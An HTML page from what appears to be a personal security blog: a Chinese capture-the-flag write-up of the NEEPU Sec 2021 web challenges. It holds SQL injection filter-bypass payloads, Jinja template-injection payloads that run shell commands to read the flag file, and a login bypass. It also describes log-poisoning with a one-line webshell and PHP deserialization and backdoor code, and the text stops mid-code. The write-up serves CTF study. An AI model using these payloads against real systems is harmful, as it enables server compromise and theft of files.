@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="[NEEPU Sec 2021 公开赛]WP前言：这哪是新生赛呀，web方向题目难度还是特别高的，但是复现之后感觉质量真的挺高的，这里记录下感觉有点意思的题目 随便注2.0这里过滤了上传用了的字符： 1return preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|rename|set|handler|char|\*| |">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NEEPU Sec 2021 公开赛 WP">
+<meta property="og:url" content="http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/index.html">
+<meta property="og:site_name" content="w0s1np&#39;s blog">
+<meta property="og:description" content="[NEEPU Sec 2021 公开赛]WP前言：这哪是新生赛呀，web方向题目难度还是特别高的，但是复现之后感觉质量真的挺高的，这里记录下感觉有点意思的题目 随便注2.0这里过滤了上传用了的字符： 1return preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|rename|set|handler|char|\*| |">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://woshilnp.github.io/wzimg/274.png">
+<meta property="og:image" content="https://woshilnp.github.io/wzimg/275.png">
+<meta property="og:image" content="https://woshilnp.github.io/wzimg/280.png">
+<meta property="og:image" content="https://woshilnp.github.io/wzimg/281.png">
+<meta property="og:image" content="https://woshilnp.github.io/wzimg/282.png">
+<meta property="og:image" content="https://woshilnp.github.io/wzimg/283.png">
+<meta property="og:image" content="https://woshilnp.github.io/wzimg/284.png">
+<meta property="og:image" content="https://woshilnp.github.io/wzimg/276.png">
+<meta property="og:image" content="https://woshilnp.github.io/wzimg/268.png">
+<meta property="og:image" content="https://woshilnp.github.io/wzimg/269.png">
+<meta property="og:image" content="https://woshilnp.github.io/wzimg/270.png">
+<meta property="og:image" content="https://woshilnp.github.io/wzimg/271.png">
+<meta property="og:image" content="https://woshilnp.github.io/wzimg/277.png">
+<meta property="og:image" content="https://woshilnp.github.io/wzimg/278.png">
+<meta property="og:image" content="https://woshilnp.github.io/wzimg/279.png">
+<meta property="article:published_time" content="2021-05-26T11:59:50.000Z">
+<meta property="article:modified_time" content="2021-05-26T12:01:40.993Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://woshilnp.github.io/wzimg/274.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>NEEPU Sec 2021 公开赛 WP</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/projects_url">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/06/15/%E8%93%9D%E5%B8%BD%E6%9D%AF2021-One-Pointer-PHP/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/05/23/%E8%AF%A6%E8%A7%A3php-filter%E4%BB%A5%E5%8F%8A%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&text=NEEPU Sec 2021 公开赛 WP"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&title=NEEPU Sec 2021 公开赛 WP"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&is_video=false&description=NEEPU Sec 2021 公开赛 WP"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NEEPU Sec 2021 公开赛 WP&body=Check out this article: http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&title=NEEPU Sec 2021 公开赛 WP"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&title=NEEPU Sec 2021 公开赛 WP"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&title=NEEPU Sec 2021 公开赛 WP"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&title=NEEPU Sec 2021 公开赛 WP"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&name=NEEPU Sec 2021 公开赛 WP&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&t=NEEPU Sec 2021 公开赛 WP"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP"><span class="toc-number">1.</span> <span class="toc-text">[NEEPU Sec 2021 公开赛]WP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E4%BE%BF%E6%B3%A82-0"><span class="toc-number">1.2.</span> <span class="toc-text">随便注2.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-myth-of-Aladdin"><span class="toc-number">1.3.</span> <span class="toc-text">The_myth_of_Aladdin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gamebox"><span class="toc-number">1.4.</span> <span class="toc-text">gamebox</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#serialize-club"><span class="toc-number">1.5.</span> <span class="toc-text">serialize_club</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#upload-club"><span class="toc-number">1.6.</span> <span class="toc-text">upload_club</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        NEEPU Sec 2021 公开赛 WP
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-05-26T11:59:50.000Z" itemprop="datePublished">2021-05-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/writeup/" rel="tag">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="NEEPU-Sec-2021-公开赛-WP"><a href="#NEEPU-Sec-2021-公开赛-WP" class="headerlink" title="[NEEPU Sec 2021 公开赛]WP"></a>[NEEPU Sec 2021 公开赛]WP</h2><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>这哪是新生赛呀，<code>web</code>方向题目难度还是特别高的，但是复现之后感觉质量真的挺高的，这里记录下感觉有点意思的题目</p>
+<h3 id="随便注2-0"><a href="#随便注2-0" class="headerlink" title="随便注2.0"></a>随便注2.0</h3><p>这里过滤了上传用了的字符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">return preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|rename|set|handler|char|\*| |	|\.&#x2F;i&quot;,$inject);<br></code></pre></td></tr></table></figure>
+
+<p>但还是先注出一些有用的数据先把：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-number">0</span>%27;show%0ddatabases;%23<br><span class="hljs-number">0</span>%27;show%0dtables;%23<br>得到：<span class="hljs-string">&quot;@Neepu2021招新赛&quot;</span>和<span class="hljs-string">&quot;words&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>%<span class="hljs-number">27</span>;show%<span class="hljs-number">0</span>dcolumns%<span class="hljs-number">0</span>dfrom%<span class="hljs-number">0</span>dwords;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://woshilnp.github.io/wzimg/274.png" alt="a"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>%<span class="hljs-number">27</span>;show%<span class="hljs-number">0</span>dcolumns%<span class="hljs-number">0</span>dfrom%<span class="hljs-number">0</span>d`@Neepu<span class="hljs-number">2021</span>招新赛`;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://woshilnp.github.io/wzimg/275.png" alt="a"></p>
+<p>但是当我们输入1读取数据的时候，是一个2个数据的数组，所以这里就对应<code>words</code>列里面的字段，即默认查询<code>words</code>里面的数据，原题就可以使用<code>rename</code>把<code>@Neepu2021招新赛</code>修改为<code>words</code>就可以读取了，但这里被过滤了，原题还可以使用PDO预编译，虽然这里过滤了<code>set</code>，但是其实不用<code>set</code>也可以，payload：如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;;PREPARE w<span class="hljs-number">0</span>s<span class="hljs-number">1</span>np from concat(&#x27;sel&#x27;,&#x27;ect flag from `@Neepu<span class="hljs-number">2021</span>招新赛`&#x27;);EXECUTE w<span class="hljs-number">0</span>s<span class="hljs-number">1</span>np;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<p>这里是为了看没有绕过空格，使用的时候直接把空格改成<code>%0d</code>即可</p>
+<h3 id="The-myth-of-Aladdin"><a href="#The-myth-of-Aladdin" class="headerlink" title="The_myth_of_Aladdin"></a>The_myth_of_Aladdin</h3><p>知识点：</p>
+<p>绕过<code>&#123;&#123;&#125;&#125;` 空格 `.`  `_` 
+
+这里可以采用`unicode`的方法进行绕过
+
+![a](https://woshilnp.github.io/wzimg/273.png)
+
+发现可以利用`&#123;%print%&#125;`绕过`&#123;&#123;&#125;&#125;</code></p>
+<p>然后过滤了关键字，尝试用编码绕过，发现就<code>unicode</code>编码能绕过，大致payload如下：</p>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;%print(<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="hljs-number">132</span>][<span class="hljs-string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u0070\u006f\u0070\u0065\u006e&quot;</span>](<span class="hljs-string">&quot;\u006c\u0073&quot;</span>)[<span class="hljs-string">&quot;\u0072\u0065\u0061\u0064&quot;</span>]())%&#125;<br><br>&#123;%print(<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;__class__&quot;</span>]<br>[<span class="hljs-string">&quot;__base__&quot;</span>]<br>[<span class="hljs-string">&quot;__subclasses__&quot;</span>]()<br>[<span class="hljs-number">132</span>][<span class="hljs-string">&quot;__init__&quot;</span>]<br>[<span class="hljs-string">&quot;__globals__&quot;</span>]<br>[<span class="hljs-string">&quot;popen&quot;</span>]<br>(<span class="hljs-string">&quot;ls&quot;</span>)<br>[<span class="hljs-string">&quot;read&quot;</span>]())%&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>ls</code>命令可以成功执行，但当我们尝试读取<code>flag</code>的时候却不行，估计过滤了常见命令，可以使用<code>base64 /f*</code>绕过</p>
+<p>最后payload：</p>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;%print(<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="hljs-number">132</span>][<span class="hljs-string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u0070\u006f\u0070\u0065\u006e&quot;</span>](<span class="hljs-string">&quot;\u0062\u0061\u0073\u0065\u0036\u0034\u0020\u002f\u0066\u002a&quot;</span>)[<span class="hljs-string">&quot;\u0072\u0065\u0061\u0064&quot;</span>]())%&#125;<br><br>&#123;%print(<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;__class__&quot;</span>]<br>[<span class="hljs-string">&quot;__base__&quot;</span>]<br>[<span class="hljs-string">&quot;__subclasses__&quot;</span>]()<br>[<span class="hljs-number">132</span>][<span class="hljs-string">&quot;__init__&quot;</span>]<br>[<span class="hljs-string">&quot;__globals__&quot;</span>]<br>[<span class="hljs-string">&quot;popen&quot;</span>]<br>(<span class="hljs-string">&quot;base64 /f*&quot;</span>)<br>[<span class="hljs-string">&quot;read&quot;</span>]())%&#125;<br></code></pre></td></tr></table></figure>
+
+<p>还有一个读取文件的方法：<code>cut 截断数组带出</code></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">(<span class="hljs-string">&quot;c&quot;</span><span class="hljs-string">&quot;ut%09-c%092-40%09/fl&quot;</span><span class="hljs-string">&quot;ag&quot;</span>)<br>即(<span class="hljs-string">&quot;cut -c 2-40 /flag&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="gamebox"><a href="#gamebox" class="headerlink" title="gamebox"></a>gamebox</h3><p>知识点：</p>
+<p>SQL万能密码</p>
+<p>日志包含</p>
+<p>上来一个登录框(只有username)，猜测后台的SQL语句为<code>select * from user where username = &#39;$username&#39;</code>，但是<code>ban</code>了很多字符，如<code>or</code>、<code>||</code>、<code>#</code>、<code>--</code>等等，这里把可以通过<code>a&#39;=&#39;0</code>登陆上去，原理就是<code>username=a</code>为<code>null</code>，<code>null=a</code>为<code>true</code></p>
+<p>然后就是猜正反</p>
+<p>然后查看服务器是<code>nginx</code>服务，就去包含日志文件：<code>/var/log/nginx/access.log</code></p>
+<p>然后就在<code>User-Agent</code>包含一句话木马</p>
+<p>然后连蚂蚁的剑就行了</p>
+<h3 id="serialize-club"><a href="#serialize-club" class="headerlink" title="serialize_club"></a>serialize_club</h3><p>知识点：</p>
+<p>任意文件读取</p>
+<p>反序列化链构造</p>
+<p><code>session_upload_progress</code>构造<code>session</code>反序列化</p>
+<p>无字母<code>webshell</code></p>
+<p><code>getshell</code>提权读取<code>flag</code></p>
+<p>进去查看原代码，发现</p>
+<p><img src="https://woshilnp.github.io/wzimg/280.png" alt="a"></p>
+<p>存在任意文件读取，读取<code>functions/file.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *	<span class="hljs-doctag">@author</span>: Ricky</span><br><span class="hljs-comment"> *	<span class="hljs-doctag">@function</span>: Read file</span><br><span class="hljs-comment"> *	<span class="hljs-doctag">@return</span> string</span><br><span class="hljs-comment"> *	<span class="hljs-doctag">@param</span> $filename string</span><br><span class="hljs-comment"> *  <span class="hljs-doctag">@param</span> $dirname string</span><br><span class="hljs-comment"> **/</span><br><br>header(<span class="hljs-string">&#x27;content-type:image/jpeg&#x27;</span>);<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$dirname</span> = <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^\/|\/$|\.\//&#x27;</span>, <span class="hljs-variable">$filename</span>))&#123;<br>    <span class="hljs-variable">$file</span> = file_get_contents(<span class="hljs-variable">$dirname</span>.<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Read fail :(&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>发现不允许目录穿越，只允许在<code>/var/www/html</code>这里</p>
+<p>然后尝试读取<code>index.php</code>, 发现可以读取同时包含了<code>config/backdoor.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config/backdoor.php&quot;</span>;<br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">neepu</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span><br>        <span class="hljs-comment">//! Neepu</span><br>        <span class="hljs-variable">$neepu</span>,<br>        <span class="hljs-comment">//! Memory-held data</span><br>        <span class="hljs-variable">$data</span>,<br>        <span class="hljs-comment">//! Info</span><br>        <span class="hljs-variable">$info</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;neepu = <span class="hljs-string">&quot;&lt;a class=\&quot;navbar-brand\&quot; href=\&quot;index.php\&quot;&gt;Serialize&lt;/a&gt;&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;info[<span class="hljs-string">&#x27;info&#x27;</span>] = <span class="hljs-string">&quot;&lt;a class=\&quot;navbar-brand\&quot; href=\&quot;index.php\&quot;&gt;PHPINFO&lt;/a&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkinfo</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;info&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;neepu;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;info[<span class="hljs-string">&#x27;info&#x27;</span>];<br>            phpinfo();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;neepu;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;info[<span class="hljs-string">&#x27;info&#x27;</span>]-&gt;data;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Neepu!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">n33pu</span> </span>&#123;<br>    <span class="hljs-keyword">public</span><br>        <span class="hljs-comment">//! Neepu func</span><br>        <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-variable">$Neepu</span> = <span class="hljs-keyword">$this</span>-&gt;func;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Neepu</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dumb</span> </span>&#123;<br>    <span class="hljs-keyword">public</span><br>        <span class="hljs-comment">//! dumb</span><br>        <span class="hljs-variable">$dumb</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">silly</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Who care about it?&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;dumb-&gt;silly();<br>    &#125;<br>&#125;<br><span class="hljs-variable">$Neepu</span> = <span class="hljs-keyword">new</span> neepu();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$Neepu</span>-&gt;checkinfo();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>读取<code>config/backdoor.php</code>，发现是个后门写入，但是只能通过一些特殊字符组成<code>webshell</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span><br>        <span class="hljs-comment">//! eval code</span><br>        <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[;+=!@\$\&quot;\.\_\(\)\[\]]&#123;1,&#125;/i&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;cmd)) &#123;<br>            file_put_contents(<span class="hljs-string">&quot;/var/www/html/neepu.php&quot;</span>, <span 